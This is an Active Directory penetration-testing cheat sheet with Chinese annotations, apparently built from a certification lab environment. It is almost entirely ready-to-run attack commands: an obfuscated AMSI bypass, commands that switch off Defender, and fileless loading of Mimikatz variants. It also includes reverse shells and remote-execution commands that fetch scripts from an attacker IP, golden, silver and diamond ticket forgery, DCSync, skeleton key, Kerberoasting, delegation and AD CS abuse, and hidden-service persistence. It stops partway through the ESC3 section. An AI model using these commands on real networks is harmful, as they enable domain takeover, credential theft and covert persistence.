# AD Cheat Sheet

## Execution Policy
- `powershell -ExecutionPolicy bypass`
- `powershell -c {cmd}`
- `powershell -ep bypass`
- `powershell -encodedcommand "xxx"`
	- 使用 UTF-16LE 來進行編碼
	- Power Shell 解法
```powershell
$s = "Write-Output meow"
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
```
		- Python 解法
```python
import base64
s = "Write-Output meow"
encoded_bytes = s.encode('utf-16le')
base64_string = base64.b64encode(encoded_bytes).decode('ascii')
print(base64_string)
```
- `$env:PSExecutionPolicyPreference="bypass"`

## Bypass PowerShell Security
### Invisi-Shell
https://github.com/OmerYa/Invisi-Shell
這套工具 Hook 了 .NET 的 Assembly `(System.Management.Automation.dll and System.Core.dll)` 來 Bypass 紀錄
使用 CLR (Common Language Runtime) profiler 來實現 Hook。CLR 是一個 DLL 包含了一系列的 function 來收發 message。他可以 Bypass ScriptBlock logging, Module logging, Transcription, AMSI
- 有 Admin 權限
	- `RunWithPathAsAdmin.bat`
- 沒 Admin 權限
	- `RunWithRegistryNonAdmin.bat`
- 結束後
	- `exit`
### Bypass AMSI
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

### 關 AV
- `Set-MpPreference -DisableRealtimeMonitoring $true`
- `Set-MpPreference -DisableIOAVProtection $true`
	- 關閉下載檔案掃描的監測功能
- 一行搞定以上兩個東東
	- `Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableRealtimeMonitoring $true} -Computer dcorp-dc`
### Loader
- 把 Loader 丟過去
	- `copy .\Loader.exe \\dcorp-mgmt\C$\Users\Public`
- 把攻擊機的 Port 轉去 Local 
	- `winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=6666 connectaddress=172.16.99.65"`
- 用 Loader 帶起攻擊機 WebServer 上的 Exe 但不落地 
	- `winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/BetterSafetyKatz.exe sekurlsa::ekeys`

### PowerShell Remote
- 本地 Load Powershell
	- `iex(iwr http://172.16.99.65:6666/Invoke-Mimi.ps1 -UseBasicParsing)`
- 開 PS Session
	- `$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local`
	- `Enter-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local`
- 關 IO AV Protection
	- `Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess`
- 直接執行
	- `Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess`
	- `Invoke-command -Session $sess -FilePath ..\Invoke-MimiEx1.ps1`
		- 這邊的 FilePath 是 Local 的 File Path
### Bypass CLM (Constrained Language Mode, APP Locker)
- Check 
	- `reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2`
		- 如果有東西應該就是 App Locker
		- `reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script`
		- 並依序 `reg query` 裡面的東西
	- `Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections`

## Domain Enumeration
Tools
- AD Module
	- `Import-Module .\Microsoft.ActiveDirectory.Management.dll`
	- `Import-Module .\ActiveDirectory.psd1` 記得兩個都要 Import 才能有完整功能
- PowerView
	- `Import-Module .\PowerView.ps1`
### Domain
- Get Current Domain
	- `Get-Domain` (PowerView)
		- `Get-Domain -Domain moneycorp.local` 其他 Domain
	- `Get-ADDomain` (AD Module)
		- `Get-ADDomain -Identity moneycorp.local` 其他 Domain
		- 可以顯示 Domain 的 Net-BIOS Name
- Get Domain SID
	- `Get-DomainSID` (PowerView)
		- `Get-DomainSID -Domain`
	- `(Get-ADDomain).DomainSID` (AD Module)
		- `(Get-ADDomain -Identity moneycorp.local).DomainSID`
- Get Domain Policy
	- `Get-DomainPolicyData`
		- `(DomainPolicyData).SystemAccess` 取得指定欄位的東西
		- `Get-DomainPolicyData -domain moneycorp.local` 指定其他 Domain
- Get Domain Controller (DC)
	- `Get-DomainController` (PowerView)
		- `-Domain moneycorp.local` 其他 Domain
	- `Get-ADDomainController` (AD Module)
		- `-Domain Name moneycorp.local -Discover` 其他 Domain
	- `gwmi -Class win32_computersystem -ComputerName {computername}`
		- `gwmi` = `Get-WmiObject`
- Get Domain User
	- PowerView
		- `Get-DomainUser`
			- `-Identity student365` 指定使用者名稱
			- `-Properties *` 全部東東
			- `-Properties samaccountname, logonCount` 指定東東
			- `-LDAPFilter "Description=*built*"` 搜尋指定東東
	- AD Module
		- `Get-ADUser -Filter * -Properties *` 全部
			- `Get-ADUser -Identity student365 -Properties *` 指定 User
		- `Get-ADUser -Filter * -Properties * | Select -First 1` 取第一個
		- `Get-ADUser -Filter * -Properties * | Select name,logoncount` 選指定欄位
		- `Get-ADUser -Filter* -Properties * | Select name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}`套用 Expression 來算時間
		- `Get-ADUser -Filter 'Description -like "*built*"'` 搜尋指定東東
		- `Get-ADUser -Filter * -Properties * | ?{$_.samaccountname -like '*$'}` List trusted domain account (filter `$` 結尾)
		- `Get-ADUser -Server moneycorp.local -Filter *` 指定其他 Server
- Get Domain Computer
	- PowerView
		- `Get-DomainComputer`
			- `| Select Name` 最常用
			- `-OperatingSystem "*Server 2022*"` 搜尋指定系統
			- `-Ping` 先 ping 看看機器還活著再 enumerate
	- AD Module
		- `Get-ADComputer -Filter *`
			- `Get-ADComputer -Filter * | Select Name`
			- `Get-ADComputer -Filter * -Properties *`
			- `Get-ADComputer -Filter 'OperatingSystem -Like "*Server 2022*"' -Properties OperatingSystem`
			- `Get-ADComputer -Filter * -Properties DNSHostName` 會列出全部，但會包含預設省略的 DNSHostName
				- `Get-ADComputer -Filter * -Properties DNSHostName | %{Write-Output $_.DNSHostName}` 取出每一個 DNS Host Name
				- `Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}` 列出所有機器並 ping 看看
- Get Domain Group
	- PowerView
		- `Get-DomainGroup`
			- `| Select Name`
			- `-Domain moneycorp.local`
			- `*admin*` 列出 group 名字中有出現 admin ㄉ
			- `-UserName "student365"` 列出 student365 的所有 Group
		- 列出 Group Member
			- `Get-DomainGroupMember -Identity "Domain Admins" -Recurse` 
			- `(Get-DomainGroup "RDP Users").member`
	- AD Module
		- `Get-ADGroup -Filter *`
			- `Get-ADGroup -Filter * | Select Name`
			- `Get-ADGroup -Filter * -Properties *`
			- `Get-ADGroup -Filter 'Name -Like "*admin*"' | Select Name`
		- `Get-ADGroupMember -Identity "Domain Admins" -Recursive` 列出 Domain Admins 的所有成員
		- `Get-ADPrincipalGroupMembership -Identity student365` 列出 student365 的所有 Group
- List GPO 
	- PowerView
		- `Get-DomainGPO`
			- `-ComputerIdentity xxx`
			- `Get-DomainGPO -Identity "{f49a5fa1-0296-4e75-9c2d-c68c3b872d15}"`
				- 使用 OU 的 GPLink 來取 GPO
			- 預設
				- `Get-DomainGPO -Identity "Default Domain Controllers Policy`
					- 預設的 GPLink 是 `{6AC1786C-016F-11D2-945F-00C04fB984F9}`
				- `Get-DomainGPO -Identity "Default Domain Policy"`
					- 預設的 GPLink 是 `{31B2F340-016D-11D2-945F-00C04FB984F9}`
		- `Get-DomainGPOLocalGroup`
			- 取得 Restricted Groups 或 groups.xml for interesting users
		- `Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity xxx -Verbose`
			- 使用 GPO 來取得在指定機器中的 Local Group User
		- `Get-DomainGPOUserLocalGroupMapping -Identity xxx -Verbose`
			- 拿到給定ㄉ user 是 specific group 的 member 的機器
	- 可以直接 `dir \\meow.local\sysvol\meow.local\policies`
- List OU
	- PowerView
		- `Get-DomainOU`
	- AD Module
		- `Get-ADOrganizationalUnit -Filter * -Properties *`
- List GPO
	- `Get-DomainGPO -Identity (Get-DomainOU -Identity xxx).gplink.substring(11,38)`
		- 列出指定的 OU 後再來針對它的 GPLink 對 GPO 進行搜尋
- List ACL
	- `Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local"`
	- `Get-DomainObjectACL -SearchBase ("LDAP://" + (Get-DomainGroup "Domain Admins").distinguishedname)`
	- `Get-DomainObjectACL -Identity "Domain Admins" -ResolveGUIDS -Verbose`
	- `Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
- List Forest
	- PowerView
		- `Get-ForestDomain | Select Name, Forest, DomainControllers, Children`
		- `Get-ForestDomain -Forest eurocorp.local`
	- AD Module
		- `(Get-ADForest).domains`
- List Domain Trust
	- PowerView
		- `Get-DomainTrust` (Trust direction, External Trust)
			- `Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'}` (Only External Trust)
			- `Get-ForestDomain | %{Get-DomainTrust -Domain $_.name}` Forest Trust
	- AD Module
		- `Get-ADTrust -Filter * | Select Name, Direction`
		- `(Get-ADForest).Domains | %{Get-ADTrust -Filter * }` (All Forest's Domain Trust)
		- `(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}` Only External Trust
### Local
- Get Local Group
	- `Get-NetLocalGroup` (PowerView)
		- `-ComputerName xxx` 可以查其他台電腦的，但需要有權限
	- `Get-NetLocalGroupMember` (PowerView)
		- `-GroupName Administrators` 列出 local group 的成員
		- `-ComputerName xxx` 可以查其他台電腦的，但需要有權限
- Logged User
	- `Get-NetLoggedOn` (PowerView)
		- `-ComputerName xxx` 需要 local admin
	- `Get-LoggedOnLocal -ComputerName xxx` 登入的 Local User (需要 Remote Registry，Server OS 預設有開)
	- `Get-LastLoggedOn -ComputerName xxx` 上一個登入的 User
- Local Privilege Escalation
	- `Import-Module .\PowerUp.ps1`
		- `Get-ServiceUnquoted -Verbose`
			- `Write-ServiceBinary -Name 'AbyssWebServer' -Path "c:\WebServer\Abyss.exe" -UserName 'meow' -Password 'P@ssw0rd123!'`
			- `Write-ServiceBinary -Name 'AbyssWebServer' -Path "c:\WebServer\Abyss Web.exe" -Command "net localgroup administrators dcorp\student365 /add"`
			- `Restart-Service AbyssWebServer`

### SMB
- PowerView
	- `Invoke-ShareFinder` 列出整個 Domain 上所有上所有 shares
		- `-Verbose`
	- `Invoke-FileFinder` 列出 Domain 上的敏感資料
		- `-Verbose`
	- `Get-NetFileServer` 列出 Domain 中所有 File 

- List Service SPN
	- `setspn -L {SERVICE NAME}`
		- User Account, Computer Account 只要有 SPN 都可以是 Service Account
	- `setspn -q */*`
		- 列出整個 Domain 的 SPN

## Lateral movement 
- PS Remoting
	- `winrs -r:{HOSTNAME} powershell`
	- `Enter-PSSession -ComputerName {HOSTNAME}`
		- `$Cred = Get-Credential`
		- `Enter-PSSession -ComputerName {HOSTNAME} -Credential $Cred`
		- `Enter-PSSession -ComputerName {HOSTNAME} -Credential {DOMAIN\USER}`
			- 會跳出框框輸入密碼
	- `Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt`
	- `$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local`
		- `Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess`
		- `Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess`
- Find PS Remoting Local Admin Access
	- `Import-Module .\Find-PSRemotingLocalAdminAccess.ps1`
	- `Find-PSRemotingLocalAdminAccess`
- Reverse Shell
	- `powershell iex (New-Object Net.WebClient).DownloadString('http://172.16.100.65:6666/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.100.65 -Port 7777`
## Mimikatz
- `sekurlsa::ekeys` : 拿 kerberos 的 key
- `lsadump::lsa /patch`
	- Extracts hashes from memory by asking the LSA server
	- `/patch` : Only dumps the LM and NT password hashes
- Over Pass The hash (Kerberos)
	- `BetterSafetykatz.exe "sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /run:cmd.exe /exit"`
- Golden Ticket
	- `BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"`
	- User: 要偽造的 User
	- SID: 可以用 `whoami /user` 不要取最後一段，也可以用 PowerView 的 `Get-DomainSID`
	- Hash
		- 可以用 `/rc4` (NTLM)也可以用 `/aes256`
		- 都是使用 krbtgt 的 hash
	- Domain : `dollarcorp.moneycorp.local`
		- 可以用 `Get-NetDomain`獲得
	- 非必要的一些參數
		- id: `500`
			- User RID 預設 500
		- groups
			- 預設 Group 513, 512, 520, 518, 519
		- startoffset
			- 多久後可以開始使用 (分鐘數)
		- endin
			- 預設 AD 設定是 10 小時 (600)
		- renewmax
			- 預設 AD 設定是 7 天 (10080)
		- ptt or ticket
			- ptt : 直接 pass the ticket
			- ticket : 把 ticket 存下來
- Silver Ticket
	- `.\mimikatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:83471b07629c4a77e5514d9754f6b853 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"`
		- Target 盡量使用 FQDN
- DC Sync
	- `lsadump::dcsync /user:dcorp\krbtgt`
		- User Name 記得帶 Domain
	- `lsadump::dcsync /all /csv`
		- 顯示全部的 NTLM
- SID History
	- `kerberos::golden /domain:dollarcorp.moneycorp.local /target:moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:3199214e479a6d209711d7f653fdfa8d /user:Administrator /service:krbtgt /ticket:C:\Users\Public\t.kirbi` (請求 TGT)
		- 對於兩台 DC 互相 Trust 的狀況下
			- Inter-Realm Key
				- `domain` 原始 domain
				- `target` 目標 Domain
				- `sid` 目前 Domain SID
				- `sids` 目標的 Parent Domain SID (Enterprise Admins SID)
				- `rc4` trust key
				- `service` 目標 Service
				- `ticket` 存擋目標
				- 接著使用 Rubeus 來請求 TGS
					- `Rubeus.exe asktgs /ticket:C:\Users\Public\t.kirbi /service:ldap/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt`
			- 有第一台的 Krbtgt 可以直接拿第二台的 Golden Ticket
				- `kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /user:Administrator /ptt`
					- `domain` 原始的
					- `sid` 原始 SID
					- `sids` 目標 Group SID (Enterprise Admins SID)
					- `krbtgt` 原始機器上的 rc4 krbtgt
					- `user` 要變造的 user
- Trusted Key
	- `kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /target:eurocorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:7430f926bd403f3cdc453567bcbd19e7 /ticket:C:\Users\Public\trust_eu.kirbi`
		- `domain` 原始 domain
		- `target` 目標 domain
		- `sid` 原始 Domain sid
		- `rc4` trust key
		- `ticket` 存擋位置
- Skeleton Key (萬能密碼)
	- 注射密碼進去 DC 的 LSASS (重開機就沒ㄌ)
		- `Invoke-Mimikatz -Computer dcorp-dc -Command '"privilege::debug" "misc::skeleton"'`
		- 所有 User 都可以用密碼 `mimikatz` 進行燈
- Invoke-Mimi (Remote)
	- `Invoke-Mimi {computer-name} -Command {...}`
- Invoke-Mimikatz (Remote)
	- `Invoke-Mimkatz -ComputerName {computer-name} -Command {...}` 
## Rubeus
- Over Pass The Hash
	- `Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /ptt`
		- aes256 可以改成 RC4(也就是 ntlm)
		- 也可以多帶 domain 參數達到跨 Domain 的功能
			- `Rubeus.exe asktgt /user:administrator /domain:moneycorp.local /rc4:71d04f9d50ceb1f64de7a09f23e6dc4c /ptt`
- Silver Ticket
	- `Rubeus.exe silver /service:HOST/dcorp-dc /rc4:83471b07629c4a77e5514d9754f6b853 /domain:dollarcorp.moneycorp.local /user:Administrator /sid:S-1-5-21-719815819-3726368948-3917688648 /ptt`
		- Service 可以從 `(Get-DomainComputer Dcorp-DC).serviceprincipalname`
			- 例如 
				- `HOST` : Schedule Task
				- `CIFS` : SMB
				- `HOST` + `RPCSS`: wmi
				- `LDAP`: dcsyncs
			- `/` 後面盡量使用 FQDN
		- Windows 2019 (含) 後不能使用 FQDN，需要單純使用 hostname
		- RC4 是 Computer Account (後面有 `$`) 的 Hash
		- SID 是 Domain SID
	- 測試 HOST Service可以用 `schtasks /S dcorp-dc`
		- `schtasks /create /S dcorp-dc /SC Weekly /RU "NT Authority\SYSTEM" /TN "User365" /TR "powershell -c iex(iwr http://172.16.99.65:6666/Invoke-PowerShellTcpEx.ps1 -UseBasicParsing)"`
		- `schtasks /Run /S dcorp-dc /TN User365`
	- 測試 CIFS 可以用 `dir \\dcorp-dc\C$`
	- 測試 WMI 需要 `HOST` + `RPCSS`
		- `Invoke-WmiMethod win32_process -ComputerName dcorp-dc.dollarcorp.moneycorp.local -name create -argumentlist "powershell -c iex(iwr http://172.16.99.65:6666/Invoke-PowerShellTcpEx.ps1 -UseBasicParsing)"`
- Diamond Ticket
	- `.\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
		- krbkey: krbtgt 的 aes256
		- ticketuser 要偽造的 user，通常用 administrator 就好
		- ticketuserid: 500 是 administrator 的 userid
		- groups: 512 是 domain admins 的 gid
- Kerberosting
	- Get SPN in domain
		- `Get-DomainUser -SPN | Select name, serviceprincipalname`
	- Export ST
		- `.\Rubeus.exe kerberoast /format:hashcat /spn:MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local /outfile:hash.txt` (指定 SPN)
		- `.\Rubeus.exe kerberoast /format:hashcat /outfile:hash.txt` (ALL)
	- 爆破
		- `hashcat -m 13100 hash.txt 10k-worst-pass.txt`
	- 密碼是 SPN 所屬的 User 的密碼
## Abuse DSRM (Directory Services Restore Mode)
- 先取得 Domain Admin 後登進去 DC
	- 預設 `reg query HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior /t reg_dword` 應該是沒有值的
	- 手動設定成 2
		- `reg add HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior /t reg_dword /d 2`
	- 跑 mimikatz 取 DC 的 SAM 裡面的 Administrator (這是 Local Admin) 並不是 DC Sync 的 Admin
		- `Invoke-mimi dcorp-dc.dollarcorp.moneycorp.local -Command "lsadump::sam"`
	- 本地 PTH，記得 Domain 要設定為 DC 的 Host Name，並不是真正的 Domain Name
		- `privilege::debug`
		- `sekurlsa::pth /user:Administrator /domain:dcorp-dc /ntlm:a102ad5753f4c441e3af31c97fad86fd`
	- 開始使用，使用 hostname 或 FQDN 都可以
		- `dir \\dcorp-dc.dollarcorp.moneycorp.local\C$`
		- `dir \\dcorp-dc\C$`
		- `PsExec64.exe \\dcorp-dc cmd`
		- 但不能用 winrs
## ACL 
### DC Sync
- 需要三條 DACL
	- `DS-Replication-Get-Changes`
	- `DS-Replication-Get-Changes-All`
	- `DS-Replication-Get-Changes-In-Filtered-Set` 某些特定權限上需要，但很少見
- 尋找所有可以 DC Sync 的 User
```powershell
Get-DomainObjectACL -SearchBase "DC=dollarcorp, DC=moneycorp, DC=local" -SearchScope Base -ResolveGUIDS |
?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} |
ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} |
d
```
- 幫指定的人增加 DC Sync 權限
```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student365 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
- 幫指定的人移除 DC Sync 權限
```powershell
Remove-DomainObjectAcl -TargetIdentity "DC=dollarcorp, DC=moneycorp, DC=local" -PrincipalIdentity student365 -Rights DCSync -Verbose
```
### SDDL Persistent 
- SDDL Converter
	- https://github.com/canix1/SDDL-Converter
- 讓所有 User 都可以碰 Service
	- `sc.exe sdset scmanager D:(A;;KA;;;WD)`
	- `sc create LPE displayName= "LPE" binPath= "C:\Windows\System32\net.exe localgroup Administrators nonpriv-user /add" start= auto`
- 讓使用者看不到 Service
	- `sc create evilsvc`
	- `sc sdset evilsvc "D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"`
#### RACE 工具
- https://github.com/samratashok/RACE
- Domain Admin 權限
	- `Import-Module .\RACE.ps1`
	- 允許指定使用者使用 Remote WMI
		- `Set-RemoteWMI -SamAccountName student365 -Verbose -ComputerName dcorp-dc -namespace 'root\cimv2'`
		- 刪除的話，前面指令後面帶 `-Remove`
		- 接著就可以 `Invoke-WmiMethod win32_process -ComputerName dcorp-dc.dollarcorp.moneycorp.local -name create -argumentlist "powershell -c iex(iwr http://172.16.99.65:6666/Invoke-PowerShellTcpEx.ps1 -UseBasicParsing)"`
	- 允許指定使用者用 PS Remoting
		- `Set-RemotePSRemoting -SamAccountName student365 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose`
		- 刪除的話，前面指令後面帶 `-Remove`
	- 取 Remote Machine Hash
		- `Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student365 -Verbose`
		- `Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose`
		- 取到 Remote Machine Hash 後就可以用 Silver Ticket 來做各種 RCE

##   Delegation
### Unconstrained Delegation
簡單來說，User A 去訪問 Service B，而 Service B 開啟了非約束委派。
則 User A 訪問 Service B 時， User A 會把自己的 TGT 一起發給 Service B，因此， Service B 就可以透過 User A 的身份去 Access 任意服務。

如果串 Printer Bug 之類可以強迫 User A 過來戳 Service B，那基本上就代表我們可以幹走 User A 的 Credential

- Enum 
	- PowerView `Get-DomainComputer -Unconstrained`
	- ADModule `Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation`
- 用 Local Admin 登上後，使用 Rubeus 監聽 TGT 
	- `Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap`
- 並使用 Printer Bug 強制其他電腦跟它進行驗證 (使用 FQDN)
		- `MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local`
- 在本機把收到的 Ticket Pass 出去
	- `Rubeus.exe ptt /ticket:xxx`
- 就可以拿其 Computer Account 做任何事了
	- 例如 DC 的就可以跑 DC Sync 或是用 PSEXEC 連上去搞事

### Constrained Delegation
PowerView 的話，用 `Get-DomainUser -TrustedToAuth` 或 `Get-DomainComputer -TrustedToAuth`
AD-Module 用 `Get-ADUser -Filter {msds-allowedtodelegateto -ne $false} -Properties msds-allowedtodelegateto` 或 `Get-ADComputer -Filter {msds-allowedtodelegateto -ne $false} -Properties msds-allowedtodelegateto`
觀察 `msds-allowedtodelegateto` 的 SPN 就是我們可以拿來偽造的
#### Rubeus
```
Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
```

因為 S4U2proxy 特性 （S4U2Proxy 向 KDC申請 TGS 後， TGS的 Server Name 是加密的，但 Service Name 是沒有加密的，因此可以任意變造 Service），因此可以使用 `/altservice` 變造 Service，儘管它本身沒有 Delegate 的權限

```
.\Rubeus.exe s4u /user:Dcorp-adminsrv$ /impersonateuser:Administrator /msdsspn:TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /altservice:ldap /ptt
```

#### Keko
產 TGT
```
tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
```

用 tgs 的 s4u
```
tgs::s4u /tgt:前面TGT檔案路徑 /user:Administrator@dollarcorp.moneycorp.local /service:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL
```

使用 mimikatz 來進行 ptt
```
mimikatz.exe "privilege::debug" "kerberos::ptt 前面TICKET路徑" "exit"
```


之後就可以 `dir \\dcorp-mssql.dollarcorp.moneycorp.local\C$` 或 psexec 它


### Resource Based Constrained Delegation (RBCD)

假設一個 甲使用者對於 A 機器有 GenericWrite 權限，則可以幫它設定  ``
`msDS-AllowedToActOnBehalfOfOtherIdentity` 的值為 B Machine Account 權限。
`msDS-AllowedToActOnBehalfOfOtherIdentity` 的本質是一段 SDDL

想要確認 GenericWrite 可以用 PowerView 的 `Find-InterestingDomainACL` 或是 BloodHound 的 Node 的 `Transitive Object Control` 看到

如果我們有 B 機器的 Machine Account Hash，則能直接進入 A 機器，委派是指，允許 B 機器以 A 機器權限進入 A 機器。
如果我們手邊沒有任何機器，可以自己用 Domain Account 建立，需要先觀察 `ms-ds-MachineAccountQuota`

#### Power View
- 觀察 Domain 中的 RBCD 
	- `Get-DomainRBCD`
- 如果手邊沒有機器帳號，可以
	- `New-MachineAccount -MachineAccount MeowMachine -Password $(ConvertTo-SecureString 'MeowMeow12345!' -AsPlainText -Force)`
		- 需要 import Powermad
- 設定 RBCD
	- `Set-DomainRBCD -Identity A -DelegateFrom B$ -Verbose`
		- A 為 A 機器 Host Name，可以寫 FQDN
		- B 為 B 機器 Machine Account 要帶上 `$`
- 結束後再使用 `Get-DomainRBCD` 就會出現 A 允許 B 代表 A 
- 接著取 B 機器 Hash 就可以用 Rubeus 的 s4u 進入 A 機器 (例如用 http) 就能用 winrs
	- `Rubeus.exe s4u /user:dcorp-std365$ /aes256:5efe55e4be23a816bd6fb20ce516e4ffd1981772263655f28e761e94dbd3bcad /msdsspn:http/dcorp-mgmt.dollarcorp.moneycorp.local /impersonateuser:administrator /ptt`
- 清除
	- `Set-DomainRBCD -Identity dcorp-mgmt -Clear -Verbose`
#### AD Module (比較穩定)
-  設定
	- `Set-ADComputer dcorp-mgmt -PrincipalsAllowedToDelegateToAccount dcorp-std365$`
- 觀察
	- `Get-ADComputer dcorp-mgmt -Properties 'PrincipalsAllowedToDelegateToAccount'`
- 清除
	- `Set-ADComputer dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $null`
## AD CS
- Enum
	- `Certify.exe find`
- 工具
	- `pip3 install certipy-ad`
### ESC1
- 條件
	- `msPKI-Certificates-Name-Flag`:`ENROLLEE_SUPPLIES_SUBJECT`
		- 申請新證書的用戶可以幫其他人申請用戶
	- `PkiExtendedKeyUsage`: `Client Authentication`
		- 生成的證書可以用來做身份驗證
	- `Enrollment Rights`: 可以操作的 User
- 使用方法
	- `Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:HTTPSCertificates /altname:Administrator`
		- 將內容存到 `cert.pem`
		- altname 的地方可以帶 domain name 例如 `mcorp\Administrator`
	- `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
		- 任意輸入密碼：例如 `123`
	- `Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /domain:moneycorp.local /password:123 /ptt`
		- 申請 TGT

### ESC3
需要有兩個 Template，第一個允許低權限註冊一個代理證書 (Agent)，第二個允許使用代理證書請求用戶證書
- 條件
	- 第一個
		- pkiextendedkeyusage 有 `Certificate Request Agent`
		- mspki-certificate-application-policy 有 `Certificate Request Agent`
	- 第二個
		- Application Policies 有 `Certificate Request Agent`
		- pkiextendedkeyusage 有 `Client Authentication`
- 使用方法
	- 針對第一個 Template 請求
		- `Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent`
	- 用 OpenSSL 轉換
		- `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
	- 針對第二個 Template 請求
